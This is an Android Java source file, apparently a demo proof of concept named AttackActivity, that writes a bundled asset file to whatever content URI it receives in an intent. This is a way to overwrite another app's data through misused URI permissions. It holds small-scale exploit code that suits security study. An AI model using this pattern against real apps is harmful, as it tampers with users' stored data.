package com.demo.piattack;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;

import java.io.InputStream;
import java.io.OutputStream;

public class AttackActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack);

        try {
            OutputStream out = this.getContentResolver().openOutputStream(getIntent().getData());
            System.out.println(this.getAssets());
            InputStream in = this.getAssets().open("test.txt");
            byte[] buffer = new byte[1024];
            int read;
            while((read = in.read(buffer)) != -1){
                out.write(buffer,0,read);
            }
            out.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
